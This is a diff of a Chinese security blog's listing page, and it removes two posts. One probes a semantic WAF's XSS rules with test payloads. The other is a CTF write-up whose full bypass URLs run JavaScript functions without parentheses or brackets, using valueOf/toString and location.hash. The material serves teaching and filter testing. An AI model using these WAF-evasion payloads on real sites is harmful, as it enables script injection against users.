-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(1)/" class="post-title-link" itemprop="url">细品某语义waf的xss防护(1)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>假设攻击场景如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xss漏洞输出位置如下:</span><br><span class="line"></span><br><span class="line">  &lt;div&gt;用户输出可控位置&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">攻击者准备利用on事件来执行js,比如</span><br><span class="line"></span><br><span class="line">  &lt;div&gt;&lt;svg onload&#x3D;&quot;alert(&#39;xss&#39;);&quot;&gt;&lt;&#x2F;div&gt;   利用onload属性</span><br></pre></td></tr></table></figure>
-
-<p>验证在这个场景下厂商的安全防护策略</p>
-<p>分析思路：</p>
-<ol>
-<li>改变payload，根据拦截情况推测安全防护策略</li>
-</ol>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;  不拦截</span><br><span class="line">a&#x3D;&lt;img&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;  拦截</span><br></pre></td></tr></table></figure>
-<p>说明区分了认识的标签和不认识的标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;a&#x3D;&lt;div&#x2F;oxx&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;&#39;    不拦截</span><br><span class="line">&#39;a&#x3D;&lt;div&#x2F;onxx&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;&#39;   拦截</span><br></pre></td></tr></table></figure>
-<p>拦截on事件，只要以on开头就拦截</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa(&#39;&#39;;&quot;&gt;   on属性值中少一个右括号就不拦截，说明判断js语法是否正确</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa(&#39;&#39;);&quot;&gt;   拦截</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa;&quot;&gt;   不拦截</span><br></pre></td></tr></table></figure>
-<p>未知标签 &amp;&amp; on事件 &amp;&amp; 解析on属性中js &amp;&amp; on属性中调用了函数   则拦截</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onxxx&#x3D;a();&gt;     不拦截</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onxxx&#x3D;xxxxx;a();&gt;   拦截</span><br></pre></td></tr></table></figure>
-<p>on属性值需要大于一定长度</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;img&#x2F;onxxxx&#x3D;&quot;aaa&quot;&gt;  不拦截</span><br><span class="line"></span><br><span class="line">a&#x3D;&lt;img&#x2F;onxxxx&#x3D;&quot;aaaaaaa&quot;&gt;   拦截</span><br></pre></td></tr></table></figure>
-<p>已知标签on属性值大于一定长度则拦截</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>存在HTML解析和JS解析</p>
-<p>安全防护策略可能是：</p>
-<ul>
-<li>HTML解析 &amp;&amp; 未知标签 &amp;&amp; on事件 &amp;&amp; on属性值大于一定长度 &amp;&amp; 对on属性值做JS解析 &amp;&amp; on属性中调用了函数   则拦截</li>
-<li>HTML解析 &amp;&amp; 已知标签 &amp;&amp; on事件 &amp;&amp; on属性值大于一定长度  则拦截</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%A5%9E%E5%A5%87%E7%9A%84javascript-%E4%B8%8D%E7%94%A8%E6%8B%AC%E5%8F%B7%E5%B8%A6%E5%8F%82%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E7%A5%9E%E5%A5%87%E7%9A%84javascript-%E4%B8%8D%E7%94%A8%E6%8B%AC%E5%8F%B7%E5%B8%A6%E5%8F%82%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">神奇的javascript-不用括号带参执行函数</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>两周前，我遇到一个挺有意思的xss，过滤了很多符号，包括<code>&lt;&gt;=()`[]</code>等。</p>
-<p>我将此问题抽象成<a target="_blank" rel="noopener" href="https://04bdb3a0.o53.xyz/a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a=1">ctf题目</a>，题目源码公开在 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/40fcaed60727b6163b034145e332640f">github</a>。</p>
-<p>前两天在 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/40fcaed60727b6163b034145e332640f">题目评论</a> 中看到有师傅把答案贴出来了，我就说一下这个案例。</p>
-<h1 id="测试时遇到的问题"><a href="#测试时遇到的问题" class="headerlink" title="测试时遇到的问题"></a>测试时遇到的问题</h1><p>实际测试时遇到的问题，也是题目中有两个比较难的地方：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* javascript不用 &lt;&gt;&#x3D;()&#96;[] 等符号，怎么调用函数？</span><br><span class="line">* javascript不用 &lt;&gt;&#x3D;()&#96;[] 等符号，怎么调用函数，并且带上参数？</span><br></pre></td></tr></table></figure>
-
-<p>第一个问题简单一点：在发生类型转换时，会执行valueOf或者toString属性值指向的函数。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1-&#123;valueOf:function()&#123;alert(1)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>第二个问题难一点，需要对this的用法比较熟悉。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在函数外部,this指向window对象</span><br><span class="line"></span><br><span class="line">在函数内部：</span><br><span class="line"></span><br><span class="line">* 普通调用时</span><br><span class="line">  * strict模式下，this指向undeined</span><br><span class="line">  * 非strict模式下，this指向当前对象</span><br></pre></td></tr></table></figure>
-
-<p>还有一些方式改变this指向的对象，包括：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 调用call函数、apply函数等指定对象</span><br><span class="line">* new构造函数</span><br></pre></td></tr></table></figure>
-
-<p>this涉及的情况比较多，也比较反直觉，这里就不多说了。可以看 <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/113399">11 | this：从JavaScript执行上下文的视角讲清楚this</a> 这篇文章。</p>
-<h1 id="题目解法"><a href="#题目解法" class="headerlink" title="题目解法"></a>题目解法</h1><p>我的解法和 @rmb122 师傅一样：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;04bdb3a0.o53.xyz&#x2F;a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a&#x3D;xx%27-&#123;valueOf:test.a,%27call%27:%22%27%22%2blocation.hash&#125;-%27#&#39;;hello(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>我也把题目发给我做前端开发的朋友，他的解法如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;04bdb3a0.o53.xyz&#x2F;a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a&#x3D;%27%2B&#123;toString:%20test.a,call:%20%27hello%27%2B[...hello%2B%27%27][29]%2B%22%27a%27,%22%2B%22%27b%27,%22%2B%22%27c%27%22%2B[...hello%2B%27%27][56]&#125;%2B%27</span><br></pre></td></tr></table></figure>
-
-<p>中间有个小插曲：在朋友把他的解法发我后，我在代码中添加了对[]符号的过滤，因为我碰到的实际案例中也过滤了[]符号。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然当时绕过了xss的过滤，也清楚触发流程，但是我不明白为什么会这么触发。</p>
-<p>所以补了一下和此题相关的语法及概念，包括以下内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 类型转换</span><br><span class="line">* this是什么</span><br><span class="line">* 函数是一等公民</span><br></pre></td></tr></table></figure>
-
-<p>由这个问题想到，是否其他语言有类似场景？比如某个对象可控时，对它做运算会导致函数调用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj &#x3D; &#123;&quot;可控key&quot;:&quot;可控value&quot;&#125;</span><br><span class="line"></span><br><span class="line">操作 obj</span><br></pre></td></tr></table></figure>
-
-<p>这是一个木有答案的问题。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%94%A8strace%E5%AE%9A%E4%BD%8Dbug/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1356,7 +1453,7 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 </div>
